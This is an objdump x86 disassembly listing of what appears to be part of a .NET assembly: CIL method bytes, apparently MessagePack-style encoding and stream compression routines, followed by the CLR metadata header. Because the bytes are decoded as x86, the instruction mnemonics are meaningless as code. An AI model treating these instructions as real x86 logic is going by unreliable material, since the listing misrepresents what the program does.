  40574e:	00 00                	add    %al,(%eax)
  405750:	0a 07                	or     (%edi),%al
  405752:	28 4a 00             	sub    %cl,0x0(%edx)
  405755:	00 0a                	add    %cl,(%edx)
  405757:	28 58 00             	sub    %bl,0x0(%eax)
  40575a:	00 06                	add    %al,(%esi)
  40575c:	0a 02                	or     (%edx),%al
  40575e:	06                   	push   %es
  40575f:	16                   	push   %ss
  405760:	06                   	push   %es
  405761:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405764:	4c                   	dec    %esp
  405765:	00 00                	add    %al,(%eax)
  405767:	0a 02                	or     (%edx),%al
  405769:	03 16                	add    (%esi),%edx
  40576b:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405771:	00 0a                	add    %cl,(%edx)
  405773:	2a 13                	sub    (%ebx),%dl
  405775:	30 04 00             	xor    %al,(%eax,%eax,1)
  405778:	21 00                	and    %eax,(%eax)
  40577a:	00 00                	add    %al,(%eax)
  40577c:	29 00                	sub    %eax,(%eax)
  40577e:	00 11                	add    %dl,(%ecx)
  405780:	02 20                	add    (%eax),%ah
  405782:	cf                   	iret
  405783:	00 00                	add    %al,(%eax)
  405785:	00 6f ee             	add    %ch,-0x12(%edi)
  405788:	00 00                	add    %al,(%eax)
  40578a:	0a 03                	or     (%ebx),%al
  40578c:	28 09                	sub    %cl,(%ecx)
  40578e:	01 00                	add    %eax,(%eax)
  405790:	0a 0a                	or     (%edx),%cl
  405792:	02 06                	add    (%esi),%al
  405794:	28 58 00             	sub    %bl,0x0(%eax)
  405797:	00 06                	add    %al,(%esi)
  405799:	16                   	push   %ss
  40579a:	1e                   	push   %ds
  40579b:	6f                   	outsl  %ds:(%esi),(%dx)
  40579c:	4c                   	dec    %esp
  40579d:	00 00                	add    %al,(%eax)
  40579f:	0a 2a                	or     (%edx),%ch
  4057a1:	00 00                	add    %al,(%eax)
  4057a3:	00 13                	add    %dl,(%ebx)
  4057a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a8:	35 01 00 00 00       	xor    $0x1,%eax
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	16                   	push   %ss
  4057b2:	6a 3f                	push   $0x3f
  4057b4:	96                   	xchg   %eax,%esi
  4057b5:	00 00                	add    %al,(%eax)
  4057b7:	00 03                	add    %al,(%ebx)
  4057b9:	1f                   	pop    %ds
  4057ba:	7f 6a                	jg     0x405826
  4057bc:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057c1:	02 03                	add    (%ebx),%al
  4057c3:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	0a 2a                	or     (%edx),%ch
  4057ca:	03 20                	add    (%eax),%esp
  4057cc:	ff 00                	incl   (%eax)
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	6a 3d                	push   $0x3d
  4057d2:	14 00                	adc    $0x0,%al
  4057d4:	00 00                	add    %al,(%eax)
  4057d6:	02 20                	add    (%eax),%ah
  4057d8:	cc                   	int3
  4057d9:	00 00                	add    %al,(%eax)
  4057db:	00 6f ee             	add    %ch,-0x12(%edi)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 02                	or     (%edx),%al
  4057e2:	03 d2                	add    %edx,%edx
  4057e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057e5:	ee                   	out    %al,(%dx)
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	0a 2a                	or     (%edx),%ch
  4057ea:	03 20                	add    (%eax),%esp
  4057ec:	ff                   	(bad)
  4057ed:	ff 00                	incl   (%eax)
  4057ef:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057f2:	1b 00                	sbb    (%eax),%eax
  4057f4:	00 00                	add    %al,(%eax)
  4057f6:	02 20                	add    (%eax),%ah
  4057f8:	cd 00                	int    $0x0
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057fd:	ee                   	out    %al,(%dx)
  4057fe:	00 00                	add    %al,(%eax)
  405800:	0a 02                	or     (%edx),%al
  405802:	03 68 28             	add    0x28(%eax),%ebp
  405805:	5b                   	pop    %ebx
  405806:	00 00                	add    %al,(%eax)
  405808:	06                   	push   %es
  405809:	16                   	push   %ss
  40580a:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  40580d:	00 00                	add    %al,(%eax)
  40580f:	0a 2a                	or     (%edx),%ch
  405811:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  405817:	00 00                	add    %al,(%eax)
  405819:	02 20                	add    (%eax),%ah
  40581b:	ce                   	into
  40581c:	00 00                	add    %al,(%eax)
  40581e:	00 6f ee             	add    %ch,-0x12(%edi)
  405821:	00 00                	add    %al,(%eax)
  405823:	0a 02                	or     (%edx),%al
  405825:	03 69 28             	add    0x28(%ecx),%ebp
  405828:	5a                   	pop    %edx
  405829:	00 00                	add    %al,(%eax)
  40582b:	06                   	push   %es
  40582c:	16                   	push   %ss
  40582d:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405830:	00 00                	add    %al,(%eax)
  405832:	0a 2a                	or     (%edx),%ch
  405834:	02 20                	add    (%eax),%ah
  405836:	d3 00                	roll   %cl,(%eax)
  405838:	00 00                	add    %al,(%eax)
  40583a:	6f                   	outsl  %ds:(%esi),(%dx)
  40583b:	ee                   	out    %al,(%dx)
  40583c:	00 00                	add    %al,(%eax)
  40583e:	0a 02                	or     (%edx),%al
  405840:	03 28                	add    (%eax),%ebp
  405842:	59                   	pop    %ecx
  405843:	00 00                	add    %al,(%eax)
  405845:	06                   	push   %es
  405846:	16                   	push   %ss
  405847:	1e                   	push   %ds
  405848:	6f                   	outsl  %ds:(%esi),(%dx)
  405849:	4c                   	dec    %esp
  40584a:	00 00                	add    %al,(%eax)
  40584c:	0a 2a                	or     (%edx),%ch
  40584e:	03 20                	add    (%eax),%esp
  405850:	00 00                	add    %al,(%eax)
  405852:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405858:	00 00                	add    %al,(%eax)
  40585a:	02 20                	add    (%eax),%ah
  40585c:	d3 00                	roll   %cl,(%eax)
  40585e:	00 00                	add    %al,(%eax)
  405860:	6f                   	outsl  %ds:(%esi),(%dx)
  405861:	ee                   	out    %al,(%dx)
  405862:	00 00                	add    %al,(%eax)
  405864:	0a 02                	or     (%edx),%al
  405866:	03 28                	add    (%eax),%ebp
  405868:	59                   	pop    %ecx
  405869:	00 00                	add    %al,(%eax)
  40586b:	06                   	push   %es
  40586c:	16                   	push   %ss
  40586d:	1e                   	push   %ds
  40586e:	6f                   	outsl  %ds:(%esi),(%dx)
  40586f:	4c                   	dec    %esp
  405870:	00 00                	add    %al,(%eax)
  405872:	0a 2a                	or     (%edx),%ch
  405874:	03 20                	add    (%eax),%esp
  405876:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  40587c:	1b 00                	sbb    (%eax),%eax
  40587e:	00 00                	add    %al,(%eax)
  405880:	02 20                	add    (%eax),%ah
  405882:	d2 00                	rolb   %cl,(%eax)
  405884:	00 00                	add    %al,(%eax)
  405886:	6f                   	outsl  %ds:(%esi),(%dx)
  405887:	ee                   	out    %al,(%dx)
  405888:	00 00                	add    %al,(%eax)
  40588a:	0a 02                	or     (%edx),%al
  40588c:	03 69 28             	add    0x28(%ecx),%ebp
  40588f:	5a                   	pop    %edx
  405890:	00 00                	add    %al,(%eax)
  405892:	06                   	push   %es
  405893:	16                   	push   %ss
  405894:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405897:	00 00                	add    %al,(%eax)
  405899:	0a 2a                	or     (%edx),%ch
  40589b:	03 1f                	add    (%edi),%ebx
  40589d:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  4058a1:	00 00                	add    %al,(%eax)
  4058a3:	00 02                	add    %al,(%edx)
  4058a5:	20 d1                	and    %dl,%cl
  4058a7:	00 00                	add    %al,(%eax)
  4058a9:	00 6f ee             	add    %ch,-0x12(%edi)
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	0a 02                	or     (%edx),%al
  4058b0:	03 68 28             	add    0x28(%eax),%ebp
  4058b3:	5b                   	pop    %ebx
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	06                   	push   %es
  4058b7:	16                   	push   %ss
  4058b8:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058bb:	00 00                	add    %al,(%eax)
  4058bd:	0a 2a                	or     (%edx),%ch
  4058bf:	03 1f                	add    (%edi),%ebx
  4058c1:	e0 6a                	loopne 0x40592d
  4058c3:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c8:	02 20                	add    (%eax),%ah
  4058ca:	d0 00                	rolb   $1,(%eax)
  4058cc:	00 00                	add    %al,(%eax)
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 02                	or     (%edx),%al
  4058d4:	03 d2                	add    %edx,%edx
  4058d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058d7:	ee                   	out    %al,(%dx)
  4058d8:	00 00                	add    %al,(%eax)
  4058da:	0a 2a                	or     (%edx),%ch
  4058dc:	02 03                	add    (%ebx),%al
  4058de:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058e1:	00 00                	add    %al,(%eax)
  4058e3:	0a 2a                	or     (%edx),%ch
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 1b                	add    %bl,(%ebx)
  4058e9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058ec:	61                   	popa
  4058ed:	00 00                	add    %al,(%eax)
  4058ef:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058f5:	73 4d                	jae    0x405944
  4058f7:	00 00                	add    %al,(%eax)
  4058f9:	0a 0a                	or     (%edx),%cl
  4058fb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  405901:	0b 06                	or     (%esi),%eax
  405903:	07                   	pop    %es
  405904:	16                   	push   %ss
  405905:	1a 6f 45             	sbb    0x45(%edi),%ch
  405908:	00 00                	add    %al,(%eax)
  40590a:	0a 26                	or     (%esi),%ah
  40590c:	07                   	pop    %es
  40590d:	16                   	push   %ss
  40590e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405912:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405915:	16                   	push   %ss
  405916:	73 0a                	jae    0x405922
  405918:	01 00                	add    %eax,(%eax)
  40591a:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405920:	00 01                	add    %al,(%ecx)
  405922:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405925:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405928:	08 6f 45             	or     %ch,0x45(%edi)
  40592b:	00 00                	add    %al,(%eax)
  40592d:	0a 26                	or     (%esi),%ah
  40592f:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  405932:	05 dd 1a 00 00       	add    $0x1add,%eax
  405937:	00 09                	add    %cl,(%ecx)
  405939:	39 06                	cmp    %eax,(%esi)
  40593b:	00 00                	add    %al,(%eax)
  40593d:	00 09                	add    %cl,(%ecx)
  40593f:	6f                   	outsl  %ds:(%esi),(%dx)
  405940:	33 00                	xor    (%eax),%eax
  405942:	00 0a                	add    %cl,(%edx)
  405944:	dc 06                	faddl  (%esi)
  405946:	39 06                	cmp    %eax,(%esi)
  405948:	00 00                	add    %al,(%eax)
  40594a:	00 06                	add    %al,(%esi)
  40594c:	6f                   	outsl  %ds:(%esi),(%dx)
  40594d:	33 00                	xor    (%eax),%eax
  40594f:	00 0a                	add    %cl,(%edx)
  405951:	dc 11                	fcoml  (%ecx)
  405953:	05 2a 00 00 00       	add    $0x2a,%eax
  405958:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40595b:	00 02                	add    %al,(%edx)
  40595d:	00 28                	add    %ch,(%eax)
  40595f:	00 1c 44             	add    %bl,(%esp,%eax,2)
  405962:	00 0d 00 00 00 00    	add    %cl,0x0
  405968:	02 00                	add    (%eax),%al
  40596a:	07                   	pop    %es
  40596b:	00 4a 51             	add    %cl,0x51(%edx)
  40596e:	00 0d 00 00 00 00    	add    %cl,0x0
  405974:	1b 30                	sbb    (%eax),%esi
  405976:	04 00                	add    $0x0,%al
  405978:	5e                   	pop    %esi
  405979:	00 00                	add    %al,(%eax)
  40597b:	00 2e                	add    %ch,(%esi)
  40597d:	00 00                	add    %al,(%eax)
  40597f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405982:	00 00                	add    %al,(%eax)
  405984:	0a 0a                	or     (%edx),%cl
  405986:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  40598c:	00 0a                	add    %cl,(%edx)
  40598e:	0b 06                	or     (%esi),%eax
  405990:	07                   	pop    %es
  405991:	16                   	push   %ss
  405992:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405995:	00 00                	add    %al,(%eax)
  405997:	0a 06                	or     (%esi),%al
  405999:	17                   	pop    %ss
  40599a:	73 0a                	jae    0x4059a6
  40599c:	01 00                	add    %eax,(%eax)
  40599e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4059a1:	02 16                	add    (%esi),%dl
  4059a3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a9:	00 0a                	add    %cl,(%edx)
  4059ab:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059ae:	00 00                	add    %al,(%eax)
  4059b0:	0a dd                	or     %ch,%bl
  4059b2:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059b7:	39 06                	cmp    %eax,(%esi)
  4059b9:	00 00                	add    %al,(%eax)
  4059bb:	00 08                	add    %cl,(%eax)
  4059bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4059be:	33 00                	xor    (%eax),%eax
  4059c0:	00 0a                	add    %cl,(%edx)
  4059c2:	dc 06                	faddl  (%esi)
  4059c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4059c5:	dd 00                	fldl   (%eax)
  4059c7:	00 0a                	add    %cl,(%edx)
  4059c9:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059ce:	00 06                	add    %al,(%esi)
  4059d0:	39 06                	cmp    %eax,(%esi)
  4059d2:	00 00                	add    %al,(%eax)
  4059d4:	00 06                	add    %al,(%esi)
  4059d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4059d7:	33 00                	xor    (%eax),%eax
  4059d9:	00 0a                	add    %cl,(%edx)
  4059db:	dc 09                	fmull  (%ecx)
  4059dd:	2a 00                	sub    (%eax),%al
  4059df:	00 01                	add    %al,(%ecx)
  4059e1:	1c 00                	sbb    $0x0,%al
  4059e3:	00 02                	add    %al,(%edx)
  4059e5:	00 20                	add    %ah,(%eax)
  4059e7:	00 16                	add    %dl,(%esi)
  4059e9:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059f0:	02 00                	add    (%eax),%al
  4059f2:	06                   	push   %es
  4059f3:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059f6:	00 0d 00 00 00 00    	add    %cl,0x0
  4059fc:	42                   	inc    %edx
  4059fd:	53                   	push   %ebx
  4059fe:	4a                   	dec    %edx
  4059ff:	42                   	inc    %edx
  405a00:	01 00                	add    %eax,(%eax)
  405a02:	01 00                	add    %eax,(%eax)
  405a04:	00 00                	add    %al,(%eax)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	0c 00                	or     $0x0,%al
  405a0a:	00 00                	add    %al,(%eax)
  405a0c:	76 34                	jbe    0x405a42
  405a0e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a11:	33 30                	xor    (%eax),%esi
  405a13:	33 31                	xor    (%ecx),%esi
  405a15:	39 00                	cmp    %eax,(%eax)
  405a17:	00 00                	add    %al,(%eax)
  405a19:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a1f:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a26:	00 00                	add    %al,(%eax)
  405a28:	28 1e                	sub    %bl,(%esi)
  405a2a:	00 00                	add    %al,(%eax)
  405a2c:	d0 1d 00 00 23 53    	rcrb   $1,0x53230000
  405a32:	74 72                	je     0x405aa6
  405a34:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a3b:	00 f8                	add    %bh,%al
  405a3d:	3b 00                	cmp    (%eax),%eax
  405a3f:	00 c8                	add    %cl,%al
  405a41:	27                   	daa
  405a42:	00 00                	add    %al,(%eax)
  405a44:	23 55 53             	and    0x53(%ebp),%edx
  405a47:	00 c0                	add    %al,%al
  405a49:	63 00                	arpl   %eax,(%eax)
  405a4b:	00 10                	add    %dl,(%eax)
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 23                	add    %ah,(%ebx)
  405a51:	47                   	inc    %edi
  405a52:	55                   	push   %ebp
  405a53:	49                   	dec    %ecx
  405a54:	44                   	inc    %esp
  405a55:	00 00                	add    %al,(%eax)
  405a57:	00 d0                	add    %dl,%al
  405a59:	63 00                	arpl   %eax,(%eax)
  405a5b:	00 40 09             	add    %al,0x9(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	23 42 6c             	and    0x6c(%edx),%eax
  405a63:	6f                   	outsl  %ds:(%esi),(%dx)
  405a64:	62 00                	bound  %eax,(%eax)
  405a66:	00 00                	add    %al,(%eax)
  405a68:	00 00                	add    %al,(%eax)
  405a6a:	00 00                	add    %al,(%eax)
  405a6c:	02 00                	add    (%eax),%al
  405a6e:	00 01                	add    %al,(%ecx)
  405a70:	57                   	push   %edi
  405a71:	9f                   	lahf
  405a72:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a77:	00 00                	add    %al,(%eax)
  405a79:	fa                   	cli
  405a7a:	25 33 00 16 00       	and    $0x160033,%eax
  405a7f:	00 01                	add    %al,(%ecx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a89:	00 00                	add    %al,(%eax)
  405a8b:	00 47 00             	add    %al,0x0(%edi)
  405a8e:	00 00                	add    %al,(%eax)
  405a90:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a95:	00 00                	add    %al,(%eax)
  405a97:	00 02                	add    %al,(%edx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 0a                	add    %cl,(%edx)
  405a9d:	01 00                	add    %eax,(%eax)
  405a9f:	00 13                	add    %dl,(%ebx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 31                	add    %dh,(%ecx)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 02                	add    %al,(%edx)
  405aa9:	00 00                	add    %al,(%eax)
  405aab:	00 2e                	add    %ch,(%esi)
  405aad:	00 00                	add    %al,(%eax)
  405aaf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	13 00                	adc    (%eax),%eax
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	20 00                	and    %al,(%eax)
  405aba:	00 00                	add    %al,(%eax)
  405abc:	04 00                	add    $0x0,%al
  405abe:	00 00                	add    %al,(%eax)
  405ac0:	03 00                	add    (%eax),%eax
  405ac2:	00 00                	add    %al,(%eax)
  405ac4:	06                   	push   %es
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 06                	add    %al,(%esi)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 02                	add    %al,(%edx)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 01                	add    %al,(%ecx)
  405ad1:	00 00                	add    %al,(%eax)
  405ad3:	00 08                	add    %cl,(%eax)
  405ad5:	00 00                	add    %al,(%eax)
  405ad7:	00 04 00             	add    %al,(%eax,%eax,1)
  405ada:	00 00                	add    %al,(%eax)
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	fb                   	sti
  405ae3:	0a 01                	or     (%ecx),%al
  405ae5:	00 00                	add    %al,(%eax)
  405ae7:	00 00                	add    %al,(%eax)
  405ae9:	00 06                	add    %al,(%esi)
  405aeb:	00 4f 19             	add    %cl,0x19(%edi)
  405aee:	04 10                	add    $0x10,%al
  405af0:	0a 00                	or     (%eax),%al
  405af2:	8a 00                	mov    (%eax),%al
  405af4:	19 16                	sbb    %edx,(%esi)
  405af6:	0a 00                	or     (%eax),%al
  405af8:	b5 19                	mov    $0x19,%ch
  405afa:	88 18                	mov    %bl,(%eax)
  405afc:	0a 00                	or     (%eax),%al
  405afe:	9f                   	lahf
  405aff:	0f 9b 1d 06 00 3f 14 	setnp  0x143f0006
  405b06:	ae                   	scas   %es:(%edi),%al
  405b07:	0b 06                	or     (%esi),%eax
  405b09:	00 8e 08 19 16 0a    	add    %cl,0xa161908(%esi)
  405b0f:	00 b8 10 19 16 0a    	add    %bh,0xa161910(%eax)
  405b15:	00 24 18             	add    %ah,(%eax,%ebx,1)
  405b18:	9b                   	fwait
  405b19:	1d 06 00 0f 1a       	sbb    $0x1a0f0006,%eax
  405b1e:	04 10                	add    $0x10,%al
  405b20:	0e                   	push   %cs
  405b21:	00 1b                	add    %bl,(%ebx)
  405b23:	12 05 0c 0e 00 da    	adc    0xda000e0c,%al
  405b29:	18 05 0c 06 00 54    	sbb    %al,0x5400060c
  405b2f:	1c ae                	sbb    $0xae,%al
  405b31:	0b 06                	or     (%esi),%eax
  405b33:	00 3f                	add    %bh,(%edi)
  405b35:	13 f5                	adc    %ebp,%esi
  405b37:	1b 06                	sbb    (%esi),%eax
  405b39:	00 75 10             	add    %dh,0x10(%ebp)
  405b3c:	04 10                	add    $0x10,%al
  405b3e:	0a 00                	or     (%eax),%al
  405b40:	30 17                	xor    %dl,(%edi)
  405b42:	55                   	push   %ebp
  405b43:	00 06                	add    %al,(%esi)
  405b45:	00 2b                	add    %ch,(%ebx)
  405b47:	00 d2                	add    %dl,%dl
  405b49:	02 12                	add    (%edx),%dl
  405b4b:	00 20                	add    %ah,(%eax)
  405b4d:	00 b1 15 12 00 01    	add    %dh,0x1001215(%ecx)
  405b53:	00 04 10             	add    %al,(%eax,%edx,1)
  405b56:	12 00                	adc    (%eax),%al
  405b58:	ea 08 b1 15 06 00 09 	ljmp   $0x900,$0x615b108
  405b5f:	08 04 10             	or     %al,(%eax,%edx,1)
  405b62:	06                   	push   %es
  405b63:	00 f8                	add    %bh,%al
  405b65:	0b f5                	or     %ebp,%esi
  405b67:	1b 06                	sbb    (%esi),%eax
  405b69:	00 b9 14 de 17 06    	add    %bh,0x617de14(%ecx)
  405b6f:	00 ad 05 de 17 06    	add    %ch,0x617de05(%ebp)
  405b75:	00 d8                	add    %bl,%al
  405b77:	0f 5c 02             	subps  (%edx),%xmm0
  405b7a:	06                   	push   %es
  405b7b:	00 f7                	add    %dh,%bh
  405b7d:	09 b1 15 06 00 64    	or     %esi,0x64000615(%ecx)
  405b83:	0a b1 15 06 00 14    	or     0x14000615(%ecx),%dh
  405b89:	09 53 15             	or     %edx,0x15(%ebx)
  405b8c:	6f                   	outsl  %ds:(%esi),(%dx)
  405b8d:	00 d1                	add    %dl,%cl
  405b8f:	15 00 00 06 00       	adc    $0x60000,%eax
  405b94:	3c 09                	cmp    $0x9,%al
  405b96:	65 11 06             	adc    %eax,%gs:(%esi)
  405b99:	00 c3                	add    %al,%bl
  405b9b:	09 65 11             	or     %esp,0x11(%ebp)
  405b9e:	06                   	push   %es
  405b9f:	00 a4 09 65 11 06 00 	add    %ah,0x61165(%ecx,%ecx,1)
  405ba6:	4b                   	dec    %ebx
  405ba7:	0a 65 11             	or     0x11(%ebp),%ah
  405baa:	06                   	push   %es
  405bab:	00 17                	add    %dl,(%edi)
  405bad:	0a 65 11             	or     0x11(%ebp),%ah
  405bb0:	06                   	push   %es
  405bb1:	00 30                	add    %dh,(%eax)
  405bb3:	0a 65 11             	or     0x11(%ebp),%ah
  405bb6:	06                   	push   %es
  405bb7:	00 53 09             	add    %dl,0x9(%ebx)
  405bba:	65 11 06             	adc    %eax,%gs:(%esi)
  405bbd:	00 87 09 65 11 06    	add    %al,0x6116509(%edi)
  405bc3:	00 6e 09             	add    %ch,0x9(%esi)
  405bc6:	1c 0c                	sbb    $0xc,%al
  405bc8:	06                   	push   %es
  405bc9:	00 28                	add    %ch,(%eax)
  405bcb:	09 92 15 06 00 f9    	or     %edx,-0x6fff9eb(%edx)
  405bd1:	08 b1 15 06 00 e0    	or     %dh,-0x1ffff9eb(%ecx)
  405bd7:	09 65 11             	or     %esp,0x11(%ebp)
  405bda:	06                   	push   %es
  405bdb:	00 22                	add    %ah,(%edx)
  405bdd:	03 ae 0b 06 00 af    	add    -0x50fff9f5(%esi),%ebp
  405be3:	1b 04 10             	sbb    (%eax,%edx,1),%eax
  405be6:	06                   	push   %es
  405be7:	00 a7 1a 04 10 06    	add    %ah,0x610041a(%edi)
  405bed:	00 fc                	add    %bh,%ah
  405bef:	0b f5                	or     %ebp,%esi
  405bf1:	1b 0a                	sbb    (%edx),%ecx
  405bf3:	00 e0                	add    %ah,%al
  405bf5:	1c 19                	sbb    $0x19,%al
  405bf7:	16                   	push   %ss
  405bf8:	06                   	push   %es
  405bf9:	00 2f                	add    %ch,(%edi)
  405bfb:	10 0e                	adc    %cl,(%esi)
  405bfd:	1d 06 00 0d 13       	sbb    $0x130d0006,%eax
  405c02:	0e                   	push   %cs
  405c03:	1d 06 00 8f 0b       	sbb    $0xb8f0006,%eax
  405c08:	0e                   	push   %cs
  405c09:	1d 06 00 09 12       	sbb    $0x12090006,%eax
  405c0e:	04 10                	add    $0x10,%al
  405c10:	0a 00                	or     (%eax),%al
  405c12:	6a 18                	push   $0x18
  405c14:	74 19                	je     0x405c2f
  405c16:	0a 00                	or     (%eax),%al
  405c18:	2d 1a 74 19 0a       	sub    $0xa19741a,%eax
  405c1d:	00 bc 0e 74 19 0a 00 	add    %bh,0xa1974(%esi,%ecx,1)
  405c24:	34 1d                	xor    $0x1d,%al
  405c26:	88 18                	mov    %bl,(%eax)
  405c28:	0a 00                	or     (%eax),%al
  405c2a:	3e 08 88 18 0a 00 29 	or     %cl,%ds:0x29000a18(%eax)
  405c31:	08 88 18 06 00 d9    	or     %cl,-0x26fff9e8(%eax)
  405c37:	0c 04                	or     $0x4,%al
  405c39:	10 06                	adc    %al,(%esi)
  405c3b:	00 e2                	add    %ah,%dl
  405c3d:	12 04 10             	adc    (%eax,%edx,1),%al
  405c40:	06                   	push   %es
  405c41:	00 56 10             	add    %dl,0x10(%esi)
  405c44:	04 10                	add    $0x10,%al
  405c46:	0a 00                	or     (%eax),%al
  405c48:	d1 17                	rcll   $1,(%edi)
  405c4a:	74 19                	je     0x405c65
  405c4c:	0a 00                	or     (%eax),%al
  405c4e:	6b 17 74             	imul   $0x74,(%edi),%edx
  405c51:	19 06                	sbb    %eax,(%esi)
  405c53:	00 f1                	add    %dh,%cl
  405c55:	17                   	pop    %ss
  405c56:	04 10                	add    $0x10,%al
  405c58:	06                   	push   %es
  405c59:	00 b9 05 04 10 0a    	add    %bh,0xa100405(%ecx)
  405c5f:	00 91 0f 88 18 0a    	add    %dl,0xa18880f(%ecx)
  405c65:	00 06                	add    %al,(%esi)
  405c67:	0e                   	push   %cs
  405c68:	9b                   	fwait
  405c69:	1d 0a 00 4e 1b       	sbb    $0x1b4e000a,%eax
  405c6e:	74 19                	je     0x405c89
  405c70:	0a 00                	or     (%eax),%al
  405c72:	77 11                	ja     0x405c85
  405c74:	19 16                	sbb    %edx,(%esi)
  405c76:	0a 00                	or     (%eax),%al
  405c78:	8f                   	(bad)
  405c79:	17                   	pop    %ss
  405c7a:	46                   	inc    %esi
  405c7b:	11 06                	adc    %eax,(%esi)
  405c7d:	00 a4 0a 04 10 06 00 	add    %ah,0x61004(%edx,%ecx,1)
  405c84:	2a 0e                	sub    (%esi),%cl
  405c86:	ae                   	scas   %es:(%edi),%al
  405c87:	0b 06                	or     (%esi),%eax
  405c89:	00 f8                	add    %bh,%al
  405c8b:	0d 04 10 0a 00       	or     $0xa1004,%eax
  405c90:	b5 0d                	mov    $0xd,%ch
  405c92:	04 10                	add    $0x10,%al
  405c94:	0a 00                	or     (%eax),%al
  405c96:	f5                   	cmc
  405c97:	07                   	pop    %es
  405c98:	04 10                	add    $0x10,%al
  405c9a:	06                   	push   %es
  405c9b:	00 9e 14 04 10 06    	add    %bl,0x6100414(%esi)
  405ca1:	00 96 1b ae 0b 06    	add    %dl,0x60bae1b(%esi)
  405ca7:	00 d2                	add    %dl,%dl
  405ca9:	0f 5c 02             	subps  (%edx),%xmm0
  405cac:	06                   	push   %es
  405cad:	00 24 15 ae 0b 0a 00 	add    %ah,0xa0bae(,%edx,1)
  405cb4:	63 05 88 18 06 00    	arpl   %eax,0x61888
  405cba:	b8 01 04 10 06       	mov    $0x6100401,%eax
  405cbf:	00 33                	add    %dh,(%ebx)
  405cc1:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
  405cc5:	00 62 18             	add    %ah,0x18(%edx)
  405cc8:	53                   	push   %ebx
  405cc9:	15 0a 00 75 12       	adc    $0x1275000a,%eax
  405cce:	53                   	push   %ebx
  405ccf:	15 06 00 fd 1c       	adc    $0x1cfd0006,%eax
  405cd4:	55                   	push   %ebp
  405cd5:	00 06                	add    %al,(%esi)
  405cd7:	00 80 14 5c 02 06    	add    %al,0x6025c14(%eax)
  405cdd:	00 78 0d             	add    %bh,0xd(%eax)
  405ce0:	5c                   	pop    %esp
  405ce1:	02 0a                	add    (%edx),%cl
  405ce3:	00 c2                	add    %al,%dl
  405ce5:	06                   	push   %es
  405ce6:	53                   	push   %ebx
